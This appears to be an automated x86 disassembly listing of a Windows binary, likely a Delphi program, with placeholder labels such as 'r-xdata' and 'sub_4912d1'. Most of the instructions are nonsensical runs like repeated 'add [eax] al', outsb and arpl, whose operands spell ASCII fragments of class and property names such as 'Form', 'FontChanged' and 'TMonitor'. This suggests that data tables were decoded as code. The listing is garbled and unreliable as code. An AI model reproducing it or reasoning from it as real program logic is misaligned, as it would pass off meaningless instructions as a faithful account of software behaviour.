jl r-xdata
add [ ecx ] cl
add [ edx ] al
iretd
inc eax
add [ edx + eax ] dh
push [ esi + edx * 2 ]
dec ecx
add al ch
imul ecx [ ecx ] 0x80000000
add [ eax ] al
add [ eax ] al
dec eax
add [ ecx - 0x300fffe ] bl
jpo r-xdata
add [ eax ] al
add [ eax ] al
add ah ch
jg r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ esp + edx ] bh
dec ecx
add [ eax ] dh
adc [ ecx ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
bound edx [ ecx ]
dec ecx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ 0xffffffffff000000 ] 0xff
or eax [ edx + 0x6f ]
jb r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
add [ eax - 0x2fffbfa8 ] dh
jb r-xdata
add [ esi + edx * 2 + 0x56b40040 ] ch
adc al 0x40
je r-xdata
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
sub al [ fs : eax + eax + 0x4 ]
add [ eax ] al
add [ edi ] al
inc esi
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ eax + edx + 0x80040 ] bl
add [ eax ] al
or eax [ esi + 0x4d ]
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x26d754e
add [ eax ] cl
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x49117090
add [ edi ] al
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
add [ eax + eax * 2 ] bl
add [ eax ] al
add [ 0x6d726f46 ] al
jae r-xdata
insb
rcr ah 0x48
add [ esi + 0x1cff0002 ] bl
or [ ecx ] 0xec
jg r-xdata
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sub_4912d1
dec [ edi + edx * 2 ]
outsd
jb r-xdata
add al 0x4e
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ 0x65646e49 ]
js r-xdata
js r-xdata
add [ eax ] al
add al [ esi + ecx * 2 ]
popad
push edx
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ eax - 0x2f ] bl
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5007ffff ] al
jb r-xdata
scasd [ edi ]
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push es
add [ eax - 0x51 ] dl
outsb
insb
add al [ gs : eax ]
add al [ eax ]
mov eax eax
je r-xdata
insd
popad
jb r-xdata
push esp
dec ecx
add [ ebx ] al
adc [ ebp + ecx * 2 + 0x6f ] edx
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x61666544
lea eax [ eax ]
or [ ebx ] dl
dec ecx
add [ edx + ecx ] dl
push eax
inc ebx
jne r-xdata
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffb62d ] ch
jae r-xdata
je r-xdata
jne r-xdata
popa
jae r-xdata
inc ebx
add [ eax ] bl
inc ebx
add [ ebp + eax * 8 + 0x12cc0043 ] cl
inc ebx
add [ esi + eax * 8 - 0x3ad3ffbd ] al
inc ebx
add [ esi + eax * 8 - 0x3617ffbd ] dl
push es
insd
dec esi
jne r-xdata
dec ecx
add [ eax + eax - 0x32500000 ] dh
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
outsd
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x13 ] dh
dec ecx
add [ ecx ] cl
insd
dec esi
popad
popa
jb r-xdata
adc eax [ ebx ]
pushfd
insb
or [ ebp + 0x64 ] ebp
push eax
jb r-xdata
dec eax
popad
arpl [ gs : ebx + edx ] bx
dec ecx
add [ edx ] al
add [ ebx + 0x491320c0 ] cl
add [ esi ] cl
or dl [ ebx + eax * 2 + 0x75 ]
jb r-xdata
mov ebp es
inc ebx
add ah cl
adc al [ ebx ]
test dh al
inc ebx
add [ eax * 8 - 0x396bffbd ] ch
inc ebx
add al ch
leave
insd
popad
jb r-xdata
jb r-xdata
outsd
jb r-xdata
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ edx + edx * 8 ] dl
dec ecx
add ah bh

call 0x184957f6
add eax 0x6d726f46
jae r-xdata
outsd
jb r-xdata
arpl [ gs : eax + eax ] cx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx + edx ] al
dec ecx
add [ eax ] al
add [ eax ] al
add [ edx ] al
adc [ ecx + ecx * 2 ] dl
add [ ecx + ebx + 0x14560049 ] al
dec ecx
add [ edx ] ah
pop ss
dec ecx
add [ eax ] al
add [ eax ] al
add [ esi + 0x17 ] ch
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
adc al 0x49
add [ esp + edx + 0x49 ] al
sub_491a67
push ds
dec ecx
add [ edx ] al
add [ edx ] al
jmp r-xdata
add al [ eax ]
add ah [ edi + 0x200491f ]
add [ edx ] al
xlat
pop ds
dec ecx
add [ edx ] al
add [ edx ] al
add ah dl
mov [ 0x600046 ] eax
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub_491c68
dec [ 0x6b736544 ]
je r-xdata
jae r-xdata
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x570cffff ] al
je r-xdata
jae r-xdata
imul esp [ gs : edi + 0x68 ] 0x40109c74
add [ eax ] cl
aad 0x49
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440bffff ] al
jae r-xdata
add [ eax ] al
cmp bh 0xff
or [ eax + 0x69 ] cl
outsb
je r-xdata
inc ecx
jb r-xdata
outsd
jb r-xdata
dec [ edi + edx * 2 ]
jo r-xdata
cmp bh 0xff
push cs
push edi
je r-xdata
je r-xdata
outsd
outsb
je r-xdata
outsd
outsb
je r-xdata
add [ eax - 0x80000000 ] al
popad
dec esp
je r-xdata
add ah cl
out 0x49 al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
in al 0xe6
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
jb r-xdata
jb r-xdata
jo r-xdata
outsd
imul eax [ ecx + 0x72 ] 0x65
jo r-xdata
cmp bh 0xff
or eax [ ebx + 0x61 ]
jno r-xdata
or [ ebp + 0x65 ] cl
outsb
jno r-xdata
add [ eax + 0x570cffff ] al
outsd
jb r-xdata
add [ eax ] al
adc [ eax ] al
hlt
add [ eax ] 0x0
add [ eax + 0x570bffff ] al
outsd
jb r-xdata
inc ecx
jb r-xdata
jne r-xdata
outsb
inc ecx
jb r-xdata
add [ eax + 0x570dffff ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
popad
dec eax
imul esp [ gs : edi + 0x68 ] 0x40109c74
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xe6
dec ecx
add [ eax ] al
outsd
jo r-xdata
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul ebp [ edi + 0x6e ] 0x746e6f46
sbb al 0x77
inc edx
outsb
inc esi
outsd
outsb
je r-xdata
add [ eax - 0x37010000 ] cl
jo r-xdata
add [ eax - 0x57010000 ] al
fisttp [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec [ eax ]
dec ecx
inc ecx
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
push edx
arpl [ gs : esp + ebx * 4 + 0x10 ] si
inc eax
add [ eax + 0x49e6 ] dh
dec [ eax ]
dec ebp
popad
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jl r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
and ch dl
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440cffff ] al
jae r-xdata
int3
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440bffff ] al
jae r-xdata
adc [ eax ] al
cld
aam 0x49
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4605ffff ] al
outsd
outsb
je r-xdata
ja r-xdata
or ecx [ ebp + 0x65 ]
jae r-xdata
jno r-xdata
arpl [ edi + 0x6e ] bp
inc esi
outsd
outsb
je r-xdata
add [ eax + 0x4908ffff ] al
popad
push esp
outsd
jo r-xdata
add bh bh
cwde
fisttp [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x440affff ] al
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440fffff ] al
pushfd
ja r-xdata
add al dl
loop r-xdata
inc edx
popad
inc esi
outsd
outsb
je r-xdata
add [ eax + eax - 0x24470100 ] al
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d08ffff ] al
add [ eax ] 0x0
add [ eax + 0x570effff ] al
adc [ eax ] al
or al 0xe7
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
jo r-xdata
push cs
push eax
jb r-xdata
je r-xdata
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4609ffff ] al
outsd
jb r-xdata
scasd [ edi ]
add al bh
xlat
dec ecx
add [ eax ] al
add [ eax ] al
popa
jne r-xdata
adc al [ eax ]
cmp al 0xda
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440affff ] al
popa
jne r-xdata
cmp bh 0xff
add eax 0x746e6f46
jae r-xdata
jno r-xdata
arpl [ gs : esp + ebx * 4 + 0x10 ] si
inc eax
add [ edx * 8 + 0x49 ] dl
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
insd
popad
jb r-xdata
jb r-xdata
bound ecx [ ecx + 0x79 ]
outsd
dec esp
popad
jns r-xdata
inc ebx
outsd
jne r-xdata
js r-xdata
je r-xdata
fisttp [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
jo r-xdata
add [ eax + eax - 0x24270100 ] cl
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430bffff ] al
popad
inc esi
outsd
jb r-xdata
dec ebp
outsd
je r-xdata
outsb
arpl [ eax + 0x6c ] bp
adc [ ecx ] ecx
pop esp
call sub_491fb1
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add al dh
aam 0x49
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5705ffff ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
pushfd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
jne r-xdata
je r-xdata
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f15ffff ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
outsb
je r-xdata
insb
jae r-xdata
add [ eax + eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500dffff ] al
imul edi [ eax + 0x65 ] 0x6550736c
imul esp [ edi + 0x68 ] 0x40109c74
inc eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
insd
mov ah 0xaf
add al 0x0
inc ebx
push 0x65676e61
or [ eax ] ah
dec ecx
add [ ebx ] al
or dl [ esp + edx * 2 + 0x69 ]
insd
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x46
jo r-xdata
outsd
insb
inc ebx
push 0x65676e61
aam 0x46
inc edx
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f12ffff ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904ffff ] al
insd
adc [ eax ] al
in al 0xd4
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4806ffff ] al
imul esp [ gs : edi + 0x68 ] 0x40109c74
jae r-xdata
inc edx
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
inc esi
jb r-xdata
dec ebp
add al [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ edi + 0x61 ] dl
jae r-xdata
push es
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
dec ecx
add [ esi ] al
je r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
add al [ eax ]
add [ eax ] eax
adc [ eax ] al
pop es
dec eax
popad
outsb
insb
add al [ fs : eax ]
mov eax eax
sub al 0x21
dec ecx
outsb
je r-xdata
outsd
jo r-xdata
inc ebp
jbe r-xdata
add [ eax ] al
add al [ esi + eax * 2 ]
outsd
jb r-xdata
dec ecx
inc esp
add al [ eax ]
cmc
dec eax
add [ eax + eax ] al
and [ ecx ] cl
adc [ edi ] ecx
push esp
push eax
outsd
push ebx
push 0x7406776f
insd
dec eax
imul esp [ ebp + 0x5 ] 0x6d726f46
jae r-xdata
add [ eax ] cl
andps xmm0 [ ebp + 0x78 ]
shr [ ecx ] 0x49
jae r-xdata
add al [ eax ]
lea eax [ eax ]
xchg esp eax
outsd
jb r-xdata
loopne r-xdata
add [ eax ] al
outsb
outsd
outsb
inc ebp
jbe r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
je r-xdata
dec ebp
jae r-xdata
inc eax
add [ ecx ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ ecx ]
jo r-xdata
outsb
add [ ebx ] al
jo r-xdata
cmp al 0x20
dec ecx
add [ esi ] cl
or dl [ eax + edx * 2 + 0x6f ]
add [ eax + r-xdata ] dl
push cs
outsb
add [ eax + 0x40b7 ] dl
adc [ eax ] al
inc ecx
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax + 0x30040b7 ] edx
popad
and [ ecx ] cl
add al [ eax ]
lea eax [ eax ]
enter 0x4920 0x0
or [ 0x73654d54 ] cl
jae r-xdata
add eax 0x6d726f46
inc esi
outsd
jb r-xdata
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add al [ esi ]
inc eax
inc eax
add [ ecx ] al
inc ebp
add al [ eax ]
lea eax [ eax ]
nop
and [ ecx ] ecx
or [ edi ] cl
push esp
inc edi
je r-xdata
add [ ecx ] eax
push es
dec eax
popad
outsb
insb
add al 0x48
push edi
dec esi
inc esp
add ah bl
scasb [ edi ]
inc eax
add [ edi ] ch
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add esp ebx
scasb [ edi ]
inc eax
add [ esi ] al
dec eax
je r-xdata
je r-xdata
outsb
outsb
jb r-xdata
push ebx
inc edi
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
dec ebp
jo r-xdata
add [ ebp + 0x20940040 ] cl
dec ecx
add [ ecx ] dl
andps xmm2 [ eax + 0x6f ]
add [ edx ] al
add cl [ eax ]
push es
push ebx
outsd
jb r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
je r-xdata
popad
outsb
insb
inc ebp
jbe r-xdata
je r-xdata
outsb
or [ ecx ] al
inc ebp
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x1 ] si
nop
mov bh 0x40
inc ecx
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
adc [ eax ] al
aas
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
sbb al 0x40
add [ esi ] al
push ebx
outsb
jb r-xdata
add eax [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
jae r-xdata
popad
outsb
insb
add al [ gs : eax ]
aam 0x21
dec ecx
add [ eax ] cl
or dl [ ecx + ecx * 2 + 0x64 ]
insb
inc ebp
jbe r-xdata
fsubr [ esi + 0x48060040 ]
add al ah
fadd [ eax ]
inc ebx
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
sbb al 0x40
add [ esi ] al
push ebx
outsb
jb r-xdata
outsd
outsb
add [ eax ] al
sbb al 0x40
popad
jns r-xdata
add [ esp + eax * 2 ] eax
outsd
outsb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] al
sbb al 0x40
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x4 ] si
inc esp
add [ eax ] dl
inc eax
add [ esp + eax * 2 ] al
outsd
outsb
add al [ gs : eax ]
xor al 0x22
dec ecx
add [ eax ] cl
push cs
push esp
push ebx
push 0x6948776f
outsb
je r-xdata
add [ ecx ] al
dec ecx
add [ eax ] cl
or edx [ edi + edx * 2 + 0x69 ]
outsb
outsd
ja r-xdata
jb r-xdata
and [ ecx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
sub [ esi ] eax
pop esi
jbe r-xdata
dec ecx
add [ eax ] cl
adc edx [ ebx + edx * 2 + 0x65 ]
je r-xdata
outsd
outsd
imul eax [ ecx ] 0x1
adc [ edi ] eax
dec ebp
jae r-xdata
dec ecx
outsb
add [ bx ] eax
inc ebx
popad
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
adc [ eax ] ecx
dec eax
imul ebp [ esi + 0x74 ] 0x6f666e49
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
add [ eax + ecx * 8 ] ebx
inc eax
add [ edi ] al
dec ebp
jae r-xdata
outsb
outsw
inc eax
add [ edi ] al
inc ebx
popad
outsb
push ebx
push 0x2776f
add eax ebp
sub [ esi ] eax
or [ eax + 0x69 ] cl
outsb
je r-xdata
outsb
outsb
imul ebp [ esi + 0x67 ] 0x6e616843
inc ebp
jbe r-xdata
jb r-xdata
popad
or [ gs : si + 0x4d ] dl
jae r-xdata
add al [ eax ]
nop
enter 0x4922 0x0
or [ ebx ] cl
push esp
push edi
imul ebp [ esi + 0x64 ] 0x6f48776f
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax + 0x12 ] eax
inc eax
add [ edi ] al
dec eax
imul ebp [ esi + 0x74 ] 0x2727453
add [ ecx ] al
add [ eax ] dl
outsb
outsw
add [ eax + 0x12 ] al
inc eax
add [ eax ] al
adc [ eax ] al
call 0x5e4968b2
jb r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
add [ eax + eax * 2 ] bl
add [ esi ] al
popad
add al [ gs : bx + si ]
mov eax eax
sbb al 0x23
pushfd
adc [ eax ] al
add al 0x46
insb
popad
add al [ bx + si ]
add [ eax + 0x12 ] al
inc eax
add [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add al [ eax ]
add [ eax + edx + 0x52060040 ] ebx
add [ eax ] al
push ebx
outsb
push es
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
pop es
push ebx
outsb
push es
jae r-xdata
popad
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
inc eax
add [ eax ] al
sbb al 0xc8
inc eax
add [ eax + eax ] bh
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] dl
inc eax
add [ ecx ] al
add al dl
pop eax
inc eax
add al ah
rol [ ebx ] 0xd8
pop eax
inc eax
insb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jo r-xdata
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
mov esp 0x4c00440a
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] dl
add [ eax ] al
inc eax
adc al [ eax ]
push esp
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax + eax + 0x20900000 ] cl
dec ecx
add ah cl
add [ eax ] al
add al cl
and ecx [ ecx ]
fadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edx
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] dh
add [ eax ] al
or al [ esi + 0x41 ]
jo r-xdata
ror ah 0x23
dec ecx
add [ ecx ] dl
adc [ edx ] bh
push esp
inc ecx
add [ ebx + 0x4923ccc0 ] cl
add [ esi + eax * 2 ] al
insb
popad
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
inc esi
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax ] cl
jmp r-xdata
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
cmp dh [ cs : ecx ]
int3
outsb
add [ 0x6552 ] eax
jae r-xdata
add [ eax ] al
dec ecx
arpl [ edi + 0x6e ] bp
imul esp [ ebx + 0x2 ] 0x45700000
inc edx
add [ 0x9000000 ] dh
inc esi
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x265646f
add [ eax ] al
inc eax
adc al [ eax ]
cmp [ eax ] al
add [ eax ] al
or eax 0x44694246
imul ecx [ ebx + 0x65 ] 0x616f6279
jb r-xdata
jae r-xdata
imul ebp [ edi + 0x6e ] 0x9c010002
adc [ eax ] al
push es
push edx
jb r-xdata
test dh al
inc ebx
add [ eax * 8 - 0x396bffbd ] ch
inc ebx
add al ch
leave
inc ebx
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ eax + ebp * 8 - 0x3403ffb7 ] bl
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] bh
add [ eax ] al
add [ eax + 0x12 ] al
jae r-xdata
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
fsubr [ esi + 0x46050040 ]
outsd
jb r-xdata
cmp dh [ ecx ]
insb
je r-xdata
add [ 0x64705546 ] dl
popad
inc ebx
outsd
outsb
je r-xdata
add [ edx + ecx + r--data ] bh
add [ eax ] al
or eax [ esi + 0x48 ]
insb
jo r-xdata
add al [ eax ]
add [ ecx + esi * 2 ] bh
inc esp
add [ eax + eax ] bh
add [ eax ] al
or al 0x46
inc esp
popa
jne r-xdata
scasb [ edi ]
inc eax
add [ edx ] al
add [ ebx + 0x492454c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x73ffb6dc ] cl
dec ecx
add dl dl
and al 0x49
add dh bh
sub ecx [ ecx ]
add [ eax ] al
add [ eax ] al
pop edx
sub eax 0x1840049
add [ eax ] al
mov al 0xcd
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
add [ eax ] al
sbb al 0x40
dec ecx
outsb
je r-xdata
pushad
add [ eax ] al
inc esi
outsd
jb r-xdata
je r-xdata
outsd
insb
add al [ eax ]
je r-xdata
jns r-xdata
add [ eax ] dl
add [ eax ] al
or [ esi + 0x48 ] eax
insb
jo r-xdata
je r-xdata
jb r-xdata
add [ eax ] al
insb
add al [ eax ]
add ah cl
test al 0x40
add [ eax + eax ] ah
outsb
je r-xdata
popad
je r-xdata
outsd
outsb
jae r-xdata
dec ebp
je r-xdata
je r-xdata
imul ebp [ ebp + 0x2 ] 0x12400000
inc eax
add [ eax + eax ] dl
outsd
outsb
je r-xdata
add [ eax + edx + 0x12400040 ] bl
inc eax
add [ eax + edx + 0x700040 ] bl
add [ eax + eax * 2 ] bl
add [ eax ] al
push 0x5074726f
inc eax
add [ eax + 0xf000000 ] al
arpl [ gs : edx + eax ] si
add [ eax + edx + 0x740040 ] bl
add [ eax ] al
push cs
cmovbe ecx [ eax + 0x69 ]
outsb
je r-xdata
outsd
insb
outsd
je r-xdata
add [ eax ] dl
inc eax
add [ eax ] al
inc esi
dec eax
imul ebp [ esi + 0x74 ] 0x65646948
push eax
popad
jne r-xdata
add [ eax + eax ] dh
add [ esi ] cl
imul esp [ ebx + 0x53 ] 0x69747465
outsb
jae r-xdata
add [ edx ] bl
add [ eax ] al
adc eax 0x64705546
popad
je r-xdata
insd
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ edi ] cl
inc esi
dec eax
imul ebp [ esi + 0x74 ] 0x73727543
outsd
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x273
add [ eax ] dl
inc eax
add [ eax ] bl
add [ eax ] al
or eax [ esi + 0x48 ]
imul ebp [ esi + 0x74 ] 0x69746341
jbe r-xdata
add [ eax ] al
inc eax
adc al [ eax ]
inc eax
add [ eax ] al
add [ eax ] dl
inc esi
dec esi
outsd
outsb
inc edx
imul eax [ ecx + ebp * 2 + 0x4b ] 0x6f627965
popad
jb r-xdata
add [ eax ] al
insb
outsd
jae r-xdata
add [ eax + 0xc000000 ] dl
inc esi
push esp
outsd
jo r-xdata
add al [ gs : eax ]
add ah ch
lodsb [ esi ]
add [ esi + eax * 2 ] cl
popad
jne r-xdata
ja r-xdata
add al [ gs : eax ]
add [ eax + edx + 0x780040 ] bl
add [ eax ] al
or al [ esi + 0x48 ]
imul ebp [ esi + 0x74 ] 0x73756150
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
jl r-xdata
add [ esi + eax * 2 ] cl
dec eax
imul ebp [ esi + 0x74 ] 0x746e6f43
jb r-xdata
fadd [ esi + eax * 2 + 0x6000 ]
add [ eax ] al
je r-xdata
je r-xdata
dec ebp
add [ eax ] dl
inc eax
add [ ebx ] bl
add [ eax ] al
or eax 0x6f685346
ja r-xdata
add [ eax ] al
jb r-xdata
add [ edx ] cl
inc esi
dec eax
imul ebp [ esi + 0x74 ] 0x6f6c6f43
add al [ eax ]
add [ eax ] al
adc [ eax ] al
pop ecx
add [ eax ] al
add [ 0x6e694846 ] al
je r-xdata
add [ ecx ] cl
inc esi
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x26d726f
add [ eax ] al
fadd [ esi + eax * 2 + 0x4800 ]
add [ 0x756f4d46 ] cl
jae r-xdata
add al [ eax ]
add [ eax - 0x4 ] cl
dec eax
add [ eax + eax ] al
jne r-xdata
imul ebp [ esi + 0x61 ] 0x26574
add [ eax ] al
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] al
add [ edi ] al
inc esi
inc ecx
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x7000000 ] ah
dec esp
imul esi [ ebx + 0x74 ] 0x9c000002
adc [ eax ] al
xchg esp eax
add [ eax ] al
add [ 0x706f5446 ] cl
dec ebp
outsd
jae r-xdata
add [ eax ] dl
inc eax
add [ eax + 0x9000000 ] cl
inc esi
push ebx
add [ eax ] al
inc edx
push esp
imul ebp [ ebp + 0x65 ] 0x6e614872
insb
imul ebp [ esi + 0x74 ] 0x4000002
and [ ecx ] cl
mov [ eax ] eax
add [ eax ] al
